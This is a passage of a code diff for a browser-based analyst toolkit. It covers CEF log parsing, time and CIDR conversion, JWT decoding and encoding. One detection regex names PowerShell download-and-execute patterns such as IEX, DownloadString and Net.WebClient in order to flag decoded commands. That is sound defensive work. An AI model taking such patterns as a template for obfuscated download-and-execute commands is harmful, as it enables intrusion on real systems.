+      shost: 'SourceHostName', smac: 'SourceMACAddress', sntdom: 'SourceNTDomain', spt: 'SourcePort', spid: 'SourceProcessId', sproc: 'SourceProcessName',
+      src: 'SourceIP', suid: 'SourceUserID', suser: 'SourceUserName',
+      sourceTranslatedAddress: 'SourceTranslatedAddress', sourceTranslatedPort: 'SourceTranslatedPort',
+      destinationTranslatedAddress: 'DestinationTranslatedAddress', destinationTranslatedPort: 'DestinationTranslatedPort'
+    };
+    for (let n = 1; n <= 6; n++) { CEF_MAP['cs' + n] = 'DeviceCustomString' + n; CEF_MAP[`cs${n}Label`] = `DeviceCustomString${n}Label`; }
+    for (let n = 1; n <= 3; n++) { CEF_MAP['cn' + n] = 'DeviceCustomNumber' + n; CEF_MAP[`cn${n}Label`] = `DeviceCustomNumber${n}Label`; }
+    const PROTO = { 1: 'ICMP', 6: 'TCP', 17: 'UDP', 47: 'GRE', 50: 'ESP' };
+
+    const CEF_SAMPLES = {
+      'FortiGate': 'Oct 14 21:42:07 fgt-edge-01 CEF:0|Fortinet|Fortigate|v7.4.3|00013|traffic:forward deny|3|deviceExternalId=FG100FTK23000001 FTNTFGTlogid=0000000013 cat=traffic:forward FTNTFGTsubtype=forward FTNTFGTlevel=notice FTNTFGTvd=root src=192.0.2.77 spt=51522 deviceInboundInterface=wan1 FTNTFGTsrcintfrole=wan dst=10.10.20.5 dpt=3389 deviceOutboundInterface=internal FTNTFGTdstintfrole=lan proto=6 act=deny FTNTFGTpolicyid=0 FTNTFGTpolicytype=policy FTNTFGTservice=RDP FTNTFGTsrccountry=Netherlands out=0 in=0',
+      'Palo Alto': 'CEF:0|Palo Alto Networks|PAN-OS|11.1.2|vulnerability|THREAT|8|rt=Oct 14 2026 18:42:10 GMT deviceExternalId=013201000001 src=192.0.2.77 dst=203.0.113.10 sourceTranslatedAddress=0.0.0.0 destinationTranslatedAddress=10.10.30.15 cs1Label=Rule cs1=dmz-web-inbound suser= duser= app=web-browsing cs3Label=Virtual System cs3=vsys1 cs4Label=Source Zone cs4=untrust cs5Label=Destination Zone cs5=dmz deviceInboundInterface=ethernet1/1 deviceOutboundInterface=ethernet1/3 cs6Label=LogProfile cs6=to-sentinel cn1Label=SessionID cn1=482913 cnt=1 spt=40122 dpt=443 sourceTranslatedPort=0 destinationTranslatedPort=443 proto=tcp act=reset-both request="Apache Log4j Remote Code Execution Vulnerability(91991)" cat=code-execution PanOSThreatCategory=code-execution',
+      'Broken': 'CEF:0|Fortinet|Fortigate|v7.4.3|00013 src=192.0.2.77 dst=10.10.20.5'
+    };
+
+    function parseCef(line) {
+      const at = line.indexOf('CEF:');
+      if (at < 0) throw new Error('No <b>CEF:</b> marker found. Paste a full CEF line; a syslog prefix before it is fine.');
+      const prefix = line.slice(0, at).trim();
+      const s = line.slice(at + 4);
+      const hdr = []; let cur = '', k = 0;
+      for (; k < s.length && hdr.length < 7; k++) {
+        const c = s[k];
+        if (c === '\\' && (s[k + 1] === '|' || s[k + 1] === '\\')) { cur += s[k + 1]; k++; continue; }
+        if (c === '|') { hdr.push(cur); cur = ''; continue; }
+        cur += c;
+      }
+      if (hdr.length < 7) throw new Error(`Header is incomplete: CEF needs 7 pipe-separated fields before the extension, found <b>${hdr.length}</b>. Check for a missing <b>|</b>.`);
+      const ext = s.slice(k);
+      const re = /(^|\s)([A-Za-z0-9_.\-\[\]]+)=/g, keys = []; let m;
+      while ((m = re.exec(ext))) keys.push({ key: m[2], at: m.index, val: re.lastIndex });
+      const fields = keys.map((x, i) => {
+        let v = ext.slice(x.val, i + 1 < keys.length ? keys[i + 1].at : ext.length).trim();
+        v = v.replace(/\\=/g, '=').replace(/\\n/g, '\n').replace(/\\r/g, '\r').replace(/\\\\/g, '\\');
+        if (/^".*"$/.test(v)) v = v.slice(1, -1);
+        return [x.key, v];
+      });
+      return { prefix, hdr, fields };
+    }
+    function sevLabel(v) {
+      const n = Number(v);
+      if (Number.isNaN(n)) return v;
+      return n <= 3 ? 'Low' : n <= 6 ? 'Medium' : n <= 8 ? 'High' : 'Very High';
+    }
+
+    function renderCef(w) {
+      w.innerHTML = `
+        <div class="w-head"><div><h2>CEF parser</h2><p>Paste a CEF line, with or without the syslog prefix. See every field, the CommonSecurityLog column it lands in, and a starter KQL query.</p></div></div>
+        <div class="w-sec">
+          <h3><span>Input</span><span class="row-actions">${Object.keys(CEF_SAMPLES).map(k => `<button class="btn sm" data-sample="${esc(k)}">${esc(k)} sample</button>`).join('')}<button class="btn sm" id="cefClear">Clear</button></span></h3>
+          <textarea id="cefIn" spellcheck="false" placeholder="CEF:0|Vendor|Product|Version|SignatureID|Name|Severity|src=… dst=…"></textarea>
+        </div>
+        <div id="cefOut"></div>`;
+      const inp = $('#cefIn', w), out = $('#cefOut', w);
+      const run = () => {
+        const v = inp.value.trim();
+        if (!v) { out.innerHTML = `<div class="w-sec"><div class="placeholder">Paste a line or load a sample to see the breakdown.</div></div>`; return; }
+        try {
+          const { prefix, hdr, fields } = parseCef(v);
+          const F = Object.fromEntries(fields);
+          const label = n => F[`cs${n}Label`] || F[`cn${n}Label`];
+          const unmapped = fields.filter(([k]) => !CEF_MAP[k]);
+          const proto = F.proto ? (PROTO[F.proto] || F.proto.toUpperCase()) : '';
+          const actCls = /deny|drop|block|reset|reject/i.test(F.act || '') ? 'r' : F.act ? 'g' : '';
+          const sev = sevLabel(hdr[6]);
+          const pills = [
+            `<span class="pill b"><b>${esc(hdr[1])}</b>&nbsp;${esc(hdr[2])} ${esc(hdr[3])}</span>`,
+            `<span class="pill ${/High/.test(sev) ? 'w' : ''}">Severity <b>${esc(hdr[6])}</b> (${esc(sev)})</span>`,
+            F.src || F.dst ? `<span class="pill">${esc(F.src || '?')}${F.spt ? ':' + esc(F.spt) : ''} → <b>${esc(F.dst || '?')}${F.dpt ? ':' + esc(F.dpt) : ''}</b>${proto ? ' ' + esc(proto) : ''}</span>` : '',
+            F.act ? `<span class="pill ${actCls}">Action <b>${esc(F.act)}</b></span>` : '',
+            `<span class="pill">${fields.length} extension fields</span>`,
+            unmapped.length ? `<span class="pill w">${unmapped.length} → AdditionalExtensions</span>` : ''
+          ].join('');
+          const hdrRows = CEF_HEADER.map(([n, col], i) => `<tr class="hdr"><td class="k">${esc(n)}</td><td class="v"><span ${cp(hdr[i], n)}>${esc(hdr[i])}</span></td><td class="c ${col ? '' : 'dim'}">${col || '(not stored)'}</td></tr>`).join('');
+          const extRows = fields.map(([k, v]) => {
+            let col = CEF_MAP[k];
+            const num = (k.match(/^c[sn](\d)$/) || [])[1];
+            const note = num && label(num) ? ` <span class="cm">(${esc(label(num))})</span>` : '';
+            return `<tr><td class="k">${esc(k)}</td><td class="v">${v === '' ? '<span class="cm">empty</span>' : `<span ${cp(v, k)}>${esc(v)}</span>`}</td><td class="c ${col ? '' : 'dim'}">${col ? esc(col) + note : 'AdditionalExtensions'}</td></tr>`;
+          }).join('');
+
+          const q = ['CommonSecurityLog', '| where TimeGenerated > ago(1h)', `| where DeviceVendor == "${hdr[1]}" and DeviceProduct == "${hdr[2]}"`];
+          if (F.src) q.push(`| where SourceIP == "${F.src}"`);
+          if (F.dpt) q.push(`| where DestinationPort == ${Number(F.dpt) || `"${F.dpt}"`}`);
+          if (F.act) q.push(`| where DeviceAction == "${F.act}"`);
+          q.push('| project TimeGenerated, Activity, SourceIP, SourcePort, DestinationIP, DestinationPort, DeviceAction, AdditionalExtensions');
+
+          out.innerHTML = `
+            <div class="w-sec">
+              <h3><span>Breakdown</span><span class="row-actions" style="color:var(--faint)">Click any value to copy it</span></h3>
+              <div class="summary">${pills}</div>
+              ${prefix ? `<div class="info" style="margin-bottom:14px"><span><b>Syslog prefix detected:</b> <code>${esc(prefix)}</code>. The forwarder strips this; it isn't part of the CEF payload.</span></div>` : ''}
+              <div class="tbl-wrap"><table class="kv"><thead><tr><th>Field</th><th>Value</th><th>CommonSecurityLog column</th></tr></thead><tbody>${hdrRows}${extRows}</tbody></table></div>
+            </div>
+            ${kqlBlock(q.join('\n'))}`;
+        } catch (e) {
+          out.innerHTML = `<div class="w-sec"><div class="err"><svg class="i"><use href="#i-warn"/></svg><span>${e.message}</span></div></div>`;
+        }
+      };
+      inp.addEventListener('input', run);
+      w.addEventListener('click', e => {
+        const b = e.target.closest('[data-sample]'); if (b) { inp.value = CEF_SAMPLES[b.dataset.sample]; run(); }
+        if (e.target.closest('#cefClear')) { inp.value = ''; run(); inp.focus(); }
+      });
+      inp.value = CEF_SAMPLES['FortiGate']; run();
+    }
+
+    /* =========================================================
+       2. Time converter
+       ========================================================= */
+    const ZONES = ['Asia/Qatar', 'UTC', 'Europe/London', 'Europe/Berlin', 'Asia/Dubai', 'Asia/Kolkata', 'Asia/Singapore', 'America/New_York', 'America/Los_Angeles', 'Australia/Sydney'];
+    function parseTime(raw) {
+      let v = raw.trim().replace(/^datetime\((.*)\)$/i, '$1').replace(/^["']|["']$/g, '');
+      if (!v) return null;
+      if (/^now$/i.test(v)) return { d: new Date(), how: 'Current time' };
+      if (/^-?\d+(\.\d+)?$/.test(v)) {
+        const digits = v.split('.')[0].replace('-', '').length;
+        if (digits <= 10) return { d: new Date(parseFloat(v) * 1000), how: 'Unix epoch (seconds)' };
+        if (digits <= 13) return { d: new Date(parseFloat(v)), how: 'Unix epoch (milliseconds)' };
+        if (digits <= 16) return { d: new Date(parseFloat(v) / 1000), how: 'Unix epoch (microseconds)' };
+        if (digits <= 18) { const ms = Number(BigInt(v.split('.')[0]) / 10000n) - 11644473600000; return { d: new Date(ms), how: 'Windows FILETIME (100 ns since 1601)' }; }
+        return { d: new Date(Number(BigInt(v.split('.')[0]) / 1000000n)), how: 'Unix epoch (nanoseconds)' };
+      }
+      const d = new Date(v);
+      if (!isNaN(d)) return { d, how: /Z$|[+-]\d\d:?\d\d$|GMT|UTC/i.test(v) ? 'Date string with timezone' : 'Date string (read as your local time)' };
+      return { err: true };
+    }
+    function fmtZone(d, tz) {
+      const p = Object.fromEntries(new Intl.DateTimeFormat('en-GB', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZoneName: 'shortOffset' }).formatToParts(d).map(x => [x.type, x.value]));
+      return `${p.year}-${p.month}-${p.day} ${p.hour === '24' ? '00' : p.hour}:${p.minute}:${p.second} ${p.timeZoneName || ''}`.trim();
+    }
+    function relative(d) {
+      const s = Math.round((d - Date.now()) / 1000), a = Math.abs(s);
+      const rtf = new Intl.RelativeTimeFormat('en', { numeric: 'auto' });
+      if (a < 60) return rtf.format(s, 'second');
+      if (a < 3600) return rtf.format(Math.round(s / 60), 'minute');
+      if (a < 86400) return rtf.format(Math.round(s / 3600), 'hour');
+      if (a < 86400 * 45) return rtf.format(Math.round(s / 86400), 'day');
+      if (a < 86400 * 365) return rtf.format(Math.round(s / 86400 / 30), 'month');
+      return rtf.format(Math.round(s / 86400 / 365), 'year');
+    }
+    function renderTime(w) {
+      const localTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      w.innerHTML = `
+        <div class="w-head"><div><h2>Time converter</h2><p>Paste anything time-shaped: epoch seconds or milliseconds, ISO 8601, a syslog date, Windows FILETIME, or a KQL <code>datetime()</code>. The format is detected automatically.</p></div></div>
+        <div class="w-sec">
+          <div class="grid2">
+            <div class="field"><label for="tIn">Input</label><input class="inp" id="tIn" spellcheck="false" placeholder="1792003330, 2026-10-14T18:42:10Z, Oct 14 2026 18:42:10 GMT"/></div>
+            <div class="field"><label for="tZone">Extra timezone</label><select id="tZone">${ZONES.map(z => `<option ${z === 'Asia/Qatar' ? 'selected' : ''}>${z}</option>`).join('')}</select></div>
+          </div>
+          <div class="row-actions" style="margin-top:10px">
+            <button class="btn sm" data-t="now">Now</button>
+            <button class="btn sm" data-t="1792003330">Epoch (s)</button>
+            <button class="btn sm" data-t="1792003330512">Epoch (ms)</button>
+            <button class="btn sm" data-t="134364769305120000">FILETIME</button>
+            <button class="btn sm" data-t="datetime(2026-10-14T18:42:10Z)">KQL datetime</button>
+          </div>
+        </div>
+        <div id="tOut"></div>`;
+      const inp = $('#tIn', w), zone = $('#tZone', w), out = $('#tOut', w);
+      const run = () => {
+        const r = parseTime(inp.value);
+        if (!r) { out.innerHTML = `<div class="w-sec"><div class="placeholder">Enter a value or pick an example.</div></div>`; return; }
+        if (r.err || isNaN(r.d)) { out.innerHTML = `<div class="w-sec"><div class="err"><svg class="i"><use href="#i-warn"/></svg><span>Couldn't read that as a time. Try epoch digits or an ISO date like <b>2026-10-14T18:42:10Z</b>.</span></div></div>`; return; }
+        const d = r.d, ms = d.getTime(), iso = d.toISOString();
+        const ft = ((BigInt(ms) + 11644473600000n) * 10000n).toString();
+        const rows = [
+          ['UTC (ISO 8601)', iso], [zone.value, fmtZone(d, zone.value)], [`Your browser (${localTz})`, fmtZone(d, localTz)],
+          ['Unix epoch (s)', String(Math.floor(ms / 1000))], ['Unix epoch (ms)', String(ms)], ['Windows FILETIME', ft],
+          ['Relative', relative(d)], ['KQL literal', `datetime(${iso.replace('.000', '')})`]
+        ];
+        const k = iso.replace('.000', '');
+        out.innerHTML = `
+          <div class="w-sec">
+            <div class="summary"><span class="pill g">Detected: <b>${esc(r.how)}</b></span><span class="pill">${esc(relative(d))}</span></div>
+            <table class="kv"><tbody>${rows.map(([a, b]) => `<tr><td class="k">${esc(a)}</td><td class="v"><span ${cp(b, a)}>${esc(b)}</span></td></tr>`).join('')}</tbody></table>
+          </div>
+          ${kqlBlock(`// events within 5 minutes either side\nSecurityEvent\n| where TimeGenerated between (datetime(${k}) - 5m .. datetime(${k}) + 5m)`)}`;
+      };
+      inp.addEventListener('input', run); zone.addEventListener('change', run);
+      w.addEventListener('click', e => { const b = e.target.closest('[data-t]'); if (b) { inp.value = b.dataset.t; run(); } });
+      inp.value = 'now'; run();
+    }
+
+    /* =========================================================
+       3. CIDR calculator
+       ========================================================= */
+    const ipToInt = ip => { const p = ip.split('.'); if (p.length !== 4 || p.some(x => !/^\d{1,3}$/.test(x) || +x > 255)) return null; return ((+p[0] << 24) >>> 0) + (+p[1] << 16) + (+p[2] << 8) + +p[3]; };
+    const intToIp = n => [n >>> 24, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
+    const RANGES = [
+      ['10.0.0.0/8', 'Private (RFC 1918)'], ['172.16.0.0/12', 'Private (RFC 1918)'], ['192.168.0.0/16', 'Private (RFC 1918)'],
+      ['100.64.0.0/10', 'Carrier-grade NAT (RFC 6598)'], ['127.0.0.0/8', 'Loopback'], ['169.254.0.0/16', 'Link-local / APIPA'],
+      ['192.0.2.0/24', 'Documentation (TEST-NET-1)'], ['198.51.100.0/24', 'Documentation (TEST-NET-2)'], ['203.0.113.0/24', 'Documentation (TEST-NET-3)'],
+      ['224.0.0.0/4', 'Multicast'], ['0.0.0.0/8', '"This network"'], ['240.0.0.0/4', 'Reserved']
+    ];
+    const inRange = (n, cidr) => { const [b, p] = cidr.split('/'); const m = +p === 0 ? 0 : (0xFFFFFFFF << (32 - p)) >>> 0; return ((n & m) >>> 0) === ((ipToInt(b) & m) >>> 0); };
+    function renderCidr(w) {
+      w.innerHTML = `
+        <div class="w-head"><div><h2>CIDR calculator</h2><p>Subnet maths for IPv4, plus a quick check of whether an address falls inside. Handy for watchlists, firewall rules and KQL range filters.</p></div></div>
+        <div class="w-sec">
+          <div class="grid2">
+            <div class="field"><label for="cIn">Network (CIDR)</label><input class="inp" id="cIn" spellcheck="false" placeholder="10.10.20.0/22"/></div>
+            <div class="field"><label for="cChk">Check an IP (optional)</label><input class="inp" id="cChk" spellcheck="false" placeholder="10.10.23.14"/></div>
+          </div>
+          <div class="row-actions" style="margin-top:10px">${['10.10.20.0/22', '192.168.1.130/26', '172.16.0.0/12', '203.0.113.7/32'].map(x => `<button class="btn sm" data-c="${x}">${x}</button>`).join('')}</div>
+        </div>
+        <div id="cOut"></div>`;
+      const inp = $('#cIn', w), chk = $('#cChk', w), out = $('#cOut', w);
+      const run = () => {
+        const v = inp.value.trim();
+        if (!v) { out.innerHTML = `<div class="w-sec"><div class="placeholder">Enter a network like 10.10.20.0/22.</div></div>`; return; }
+        const [ipS, pS = '32'] = v.split('/'); const ip = ipToInt(ipS), p = Number(pS);
+        if (ip === null || !/^\d{1,2}$/.test(pS) || p > 32) { out.innerHTML = `<div class="w-sec"><div class="err"><svg class="i"><use href="#i-warn"/></svg><span>Use the form <b>a.b.c.d/nn</b> with a prefix from 0 to 32.</span></div></div>`; return; }
+        const mask = p === 0 ? 0 : (0xFFFFFFFF << (32 - p)) >>> 0, net = (ip & mask) >>> 0, bc = (net | (~mask >>> 0)) >>> 0;
+        const total = 2 ** (32 - p), usable = p === 32 ? 1 : p === 31 ? 2 : total - 2;
+        const first = p >= 31 ? net : net + 1, last = p >= 31 ? bc : bc - 1;
+        const cidr = `${intToIp(net)}/${p}`;
+        const kind = (RANGES.find(([r]) => inRange(net, r)) || [, 'Public'])[1];
+        const rows = [
+          ['Network', cidr], ['Netmask', intToIp(mask)], ['Wildcard', intToIp(~mask >>> 0)], ['Broadcast', p >= 31 ? 'n/a' : intToIp(bc)],
+          ['First usable', intToIp(first)], ['Last usable', intToIp(last)], ['Addresses', total.toLocaleString()], ['Usable hosts', usable.toLocaleString()]
+        ];
+        let check = '';
+        const c = chk.value.trim();
+        if (c) {
+          const ci = ipToInt(c);
+          check = ci === null ? `<span class="pill r">"${esc(c)}" is not a valid IPv4 address</span>`
+            : inRange(ci, cidr) ? `<span class="pill g"><b>${esc(c)}</b> is inside ${esc(cidr)}</span>` : `<span class="pill r"><b>${esc(c)}</b> is outside ${esc(cidr)}</span>`;
+        }
+        const bits = Array.from({ length: 32 }, (_, i) => `<i class="${i < p ? 'on' : ''} ${i % 8 === 7 && i < 31 ? 'sep' : ''}">${(ip >>> (31 - i)) & 1}</i>`).join('');
+        out.innerHTML = `
+          <div class="w-sec">
+            <div class="summary"><span class="pill b">${esc(kind)}</span>${net !== ip ? `<span class="pill w">Host bits set: normalised to ${esc(cidr)}</span>` : ''}${check}</div>
+            <div class="bits" aria-hidden="true">${bits}</div>
+            <div class="bits-legend"><span>${p} network bits</span><span>${32 - p} host bits</span></div>
+          </div>
+          <div class="w-sec"><table class="kv"><tbody>${rows.map(([a, b]) => `<tr><td class="k">${a}</td><td class="v"><span ${cp(b, a)}>${esc(b)}</span></td></tr>`).join('')}</tbody></table></div>
+          ${kqlBlock(`CommonSecurityLog\n| where TimeGenerated > ago(1d)\n| where ipv4_is_in_range(SourceIP, "${cidr}")\n| summarize Events = count() by SourceIP, DeviceAction`)}`;
+      };
+      inp.addEventListener('input', run); chk.addEventListener('input', run);
+      w.addEventListener('click', e => { const b = e.target.closest('[data-c]'); if (b) { inp.value = b.dataset.c; run(); } });
+      inp.value = '10.10.20.0/22'; chk.value = '10.10.23.14'; run();
+    }
+
+    /* =========================================================
+       4. JWT decoder
+       ========================================================= */
+    const b64urlToBytes = s => { s = s.replace(/-/g, '+').replace(/_/g, '/'); s += '='.repeat((4 - s.length % 4) % 4); const bin = atob(s); return Uint8Array.from(bin, c => c.charCodeAt(0)); };
+    const bytesToB64url = b => btoa(String.fromCharCode(...b)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    const utf8 = new TextEncoder(), utf8d = new TextDecoder();
+    const CLAIMS = {
+      aud: 'Audience: the API this token is for', iss: 'Issuer: who signed it (tenant STS)', iat: 'Issued at', nbf: 'Not valid before', exp: 'Expires at',
+      tid: 'Tenant ID', oid: 'Object ID of the user or service principal', sub: 'Subject: unique per app', upn: 'User principal name', unique_name: 'User name (v1 tokens)',
+      name: 'Display name', preferred_username: 'Sign-in name (v2 tokens)', appid: 'Client app ID (v1)', azp: 'Client app ID (v2)', app_displayname: 'Client app name',
+      scp: 'Delegated permissions (scopes)', roles: 'App roles / application permissions', amr: 'How the user authenticated', ipaddr: 'IP address the user signed in from',
+      idtyp: 'Token type: user or app', ver: 'Token version', acr: 'Authentication context class', wids: 'Entra directory role template IDs', xms_cc: 'Client capabilities'
+    };
+    const TIME_CLAIMS = new Set(['iat', 'nbf', 'exp', 'auth_time']);
+    function sampleJwt() {
+      const now = Math.floor(Date.now() / 1000);
+      const h = { alg: 'RS256', typ: 'JWT', kid: 'nx-sample-key' };
+      const p = { aud: 'https://graph.microsoft.com', iss: 'https://sts.windows.net/00000000-0000-0000-0000-000000000000/', iat: now - 900, nbf: now - 900, exp: now + 2700,
+        acr: '1', amr: ['pwd', 'mfa'], app_displayname: 'Graph Explorer', appid: '11111111-2222-3333-4444-555555555555', idtyp: 'user', ipaddr: '192.0.2.10',
+        name: 'J. Doe', oid: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', scp: 'User.Read Mail.Read openid profile', tid: '00000000-0000-0000-0000-000000000000',
+        unique_name: 'j.doe@contoso.example', upn: 'j.doe@contoso.example', ver: '1.0', wids: ['b79fbf4d-3ef9-4689-8143-76b194e85509'] };
+      return [h, p].map(o => bytesToB64url(utf8.encode(JSON.stringify(o)))).join('.') + '.' + bytesToB64url(utf8.encode('sample-signature-not-real'));
+    }
+    function jsonHl(obj) {
+      return esc(JSON.stringify(obj, null, 2))
+        .replace(/(&quot;[^&]*?&quot;)(\s*:)/g, '<span class="key">$1</span>$2')
+        .replace(/(:\s*)(&quot;.*?&quot;)/g, '$1<span class="s">$2</span>')
+        .replace(/(:\s*)(-?\d+(\.\d+)?)/g, '$1<span class="n">$2</span>')
+        .replace(/(:\s*)(true|false|null)/g, '$1<span class="k">$2</span>');
+    }
+    function renderJwt(w) {
+      w.innerHTML = `
+        <div class="w-head"><div><h2>JWT decoder</h2><p>Decode an access or ID token and read the claims in plain English. The signature is <b>not</b> verified; this is for reading, not trusting.</p></div></div>
+        <div class="w-sec">
+          <h3><span>Token</span><span class="row-actions"><button class="btn sm" id="jSample">Sample Entra token</button><button class="btn sm" id="jClear">Clear</button></span></h3>
+          <textarea id="jIn" spellcheck="false" placeholder="eyJhbGciOi…"></textarea>
+          <div class="info" style="margin-top:10px"><svg class="i"><use href="#i-lock"/></svg><span>Real tokens are credentials. Decoding happens entirely on this page, but treat a live token like a password and only paste expired or test tokens where you can.</span></div>
+        </div>
+        <div id="jOut"></div>`;
+      const inp = $('#jIn', w), out = $('#jOut', w);
+      const run = () => {
+        const v = inp.value.trim().replace(/^Bearer\s+/i, '');
+        if (!v) { out.innerHTML = `<div class="w-sec"><div class="placeholder">Paste a token or load the sample.</div></div>`; return; }
+        const parts = v.split('.');
+        try {
+          if (parts.length < 2) throw new Error('A JWT has three parts separated by dots: <b>header.payload.signature</b>.');
+          const head = JSON.parse(utf8d.decode(b64urlToBytes(parts[0]))), body = JSON.parse(utf8d.decode(b64urlToBytes(parts[1])));
+          const now = Date.now() / 1000;
+          let status = '';
+          if (body.exp) {
+            const left = body.exp - now;
+            status = left > 0 ? `<span class="pill g">Valid for <b>${relative(new Date(body.exp * 1000)).replace('in ', '')}</b></span>` : `<span class="pill r">Expired <b>${relative(new Date(body.exp * 1000))}</b></span>`;
+          }
+          if (body.nbf && body.nbf > now) status += `<span class="pill w">Not valid yet</span>`;
+          const who = body.upn || body.preferred_username || body.unique_name || (body.idtyp === 'app' ? 'application' : '');
+          const rows = Object.entries(body).map(([k, val]) => {
+            const shown = TIME_CLAIMS.has(k) && typeof val === 'number' ? `${val}  →  ${new Date(val * 1000).toISOString().replace('.000', '')} (${relative(new Date(val * 1000))})` : Array.isArray(val) ? val.join(', ') : typeof val === 'object' ? JSON.stringify(val) : String(val);
+            return `<tr><td class="k">${esc(k)}</td><td class="v"><span ${cp(Array.isArray(val) ? val.join(' ') : String(val), k)}>${esc(shown)}</span></td><td class="d">${esc(CLAIMS[k] || '')}</td></tr>`;
+          }).join('');
+          out.innerHTML = `
+            <div class="w-sec">
+              <div class="summary">${status}<span class="pill b">${esc(head.alg || '?')}</span>${who ? `<span class="pill">Subject <b>${esc(who)}</b></span>` : ''}${body.amr ? `<span class="pill ${[].concat(body.amr).includes('mfa') ? 'g' : 'w'}">Auth: <b>${esc([].concat(body.amr).join(' + '))}</b></span>` : ''}${head.alg === 'none' ? '<span class="pill r">alg "none": unsigned token</span>' : ''}</div>
+              <div class="jwt-raw"><span class="h">${esc(parts[0])}</span><span class="dot">.</span><span class="p">${esc(parts[1])}</span><span class="dot">.</span><span class="sg">${esc(parts[2] || '')}</span></div>
+            </div>
+            <div class="w-sec"><h3>Claims</h3><div class="tbl-wrap"><table class="kv"><thead><tr><th>Claim</th><th>Value</th><th>Meaning</th></tr></thead><tbody>${rows}</tbody></table></div></div>
+            <div class="w-sec"><div class="grid2"><div><h3>Header</h3><pre class="code">${jsonHl(head)}</pre></div><div><h3>Payload</h3><pre class="code" style="max-height:320px">${jsonHl(body)}</pre></div></div></div>
+            ${body.oid ? kqlBlock(`// sign-ins for the token's user\nSigninLogs\n| where TimeGenerated > ago(1d)\n| where UserId == "${body.oid}"\n| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, ResultType`) : ''}`;
+        } catch (e) {
+          out.innerHTML = `<div class="w-sec"><div class="err"><svg class="i"><use href="#i-warn"/></svg><span>${e.message && e.message.includes('<b>') ? e.message : "Couldn't decode that. Make sure you pasted the whole token, from <b>eyJ</b> to the end."}</span></div></div>`;
+        }
+      };
+      inp.addEventListener('input', run);
+      w.addEventListener('click', e => {
+        if (e.target.closest('#jSample')) { inp.value = sampleJwt(); run(); }
+        if (e.target.closest('#jClear')) { inp.value = ''; run(); inp.focus(); }
+      });
+      inp.value = sampleJwt(); run();
+    }
+
+    /* =========================================================
+       5. Encoder / decoder
+       ========================================================= */
+    const FORMATS = {
+      b64: { name: 'Base64', enc: s => btoa(String.fromCharCode(...utf8.encode(s))), dec: s => { const b = Uint8Array.from(atob(s.replace(/\s/g, '')), c => c.charCodeAt(0)); return { text: utf8d.decode(b), bytes: b }; } },
+      b64url: { name: 'Base64URL', enc: s => bytesToB64url(utf8.encode(s)), dec: s => { const b = b64urlToBytes(s.trim()); return { text: utf8d.decode(b), bytes: b }; } },
+      url: { name: 'URL', enc: s => encodeURIComponent(s), dec: s => ({ text: decodeURIComponent(s.replace(/\+/g, ' ')) }) },
+      hex: { name: 'Hex', enc: s => [...utf8.encode(s)].map(b => b.toString(16).padStart(2, '0')).join(''), dec: s => { const h = s.replace(/^0x|\s|\\x|:/gi, ''); if (!/^([0-9a-f]{2})*$/i.test(h)) throw new Error('bad hex'); const b = Uint8Array.from(h.match(/../g) || [], x => parseInt(x, 16)); return { text: utf8d.decode(b), bytes: b }; } },
+      ps: { name: 'PowerShell -EncodedCommand', enc: s => { const b = new Uint8Array(s.length * 2); for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b[i * 2] = c & 255; b[i * 2 + 1] = c >> 8; } return btoa(String.fromCharCode(...b)); },
+            dec: s => { const b = Uint8Array.from(atob(s.replace(/\s/g, '')), c => c.charCodeAt(0)); return { text: new TextDecoder('utf-16le').decode(b), bytes: b }; } }
+    };
+    function renderEnc(w) {
+      let fmt = 'ps', dir = 'dec';
+      w.innerHTML = `
+        <div class="w-head"><div><h2>Encoder / decoder</h2><p>Base64, URL, hex, and PowerShell <code>-EncodedCommand</code> (UTF-16LE Base64), the one you keep meeting in process-creation alerts.</p></div></div>
+        <div class="w-sec">
+          <h3><span class="seg" id="eFmt">${Object.entries(FORMATS).map(([k, f]) => `<button data-f="${k}" aria-pressed="${k === fmt}">${f.name}</button>`).join('')}</span>
+            <span class="seg" id="eDir"><button data-d="enc" aria-pressed="false">Encode</button><button data-d="dec" aria-pressed="true">Decode</button></span></h3>
+          <div class="enc-grid">
+            <div class="field"><label id="eInL">Encoded input</label><textarea id="eIn" spellcheck="false"></textarea></div>
+            <button class="swap" id="eSwap" title="Use output as input" aria-label="Swap input and output"><svg class="i"><use href="#i-swap"/></svg></button>
+            <div class="field"><label id="eOutL">Decoded output</label><textarea id="eOut" spellcheck="false" readonly></textarea></div>
+          </div>
+          <div class="hint-line" id="eHint"></div>
+          <div class="row-actions" style="margin-top:10px"><button class="btn sm" id="eSample">Load suspicious-looking sample</button><button class="btn sm" id="eCopy">Copy output</button></div>
+        </div>`;
+      const inp = $('#eIn', w), out = $('#eOut', w), hint = $('#eHint', w);
+      const run = () => {
+        $('#eInL', w).textContent = dir === 'dec' ? 'Encoded input' : 'Plain text';
+        $('#eOutL', w).textContent = dir === 'dec' ? 'Decoded output' : 'Encoded output';
+        hint.className = 'hint-line'; hint.textContent = '';
+        const v = inp.value; if (!v.trim()) { out.value = ''; return; }
+        try {
+          if (dir === 'enc') { out.value = FORMATS[fmt].enc(v); if (fmt === 'ps') hint.textContent = `Run with: powershell -NoProfile -EncodedCommand ${out.value.slice(0, 24)}…`; return; }
+          const r = FORMATS[fmt].dec(v);
+          out.value = r.text;
+          if (r.bytes && fmt !== 'ps' && r.bytes.length > 3 && r.bytes.filter((b, i) => i % 2 === 1 && b === 0).length > r.bytes.length / 3) {
+            hint.className = 'hint-line warn'; hint.textContent = 'Every other byte is zero: this looks like UTF-16LE. Try the PowerShell -EncodedCommand format.';
+          } else if (/[\u0000-\u0008�]/.test(r.text)) {
+            hint.className = 'hint-line warn'; hint.textContent = 'Output contains binary or invalid characters. It may be compressed, encrypted, or a different encoding.';
+          } else if (fmt === 'ps' && /IEX|Invoke-Expression|DownloadString|FromBase64String|-w(indowstyle)? hidden|Net\.WebClient/i.test(r.text)) {
+            hint.className = 'hint-line warn'; hint.textContent = 'Heads up: the decoded script contains download or execution patterns often seen in malicious commands.';
+          }
+        } catch { out.value = ''; hint.className = 'hint-line warn'; hint.textContent = `That isn't valid ${FORMATS[fmt].name}.`; }
+      };
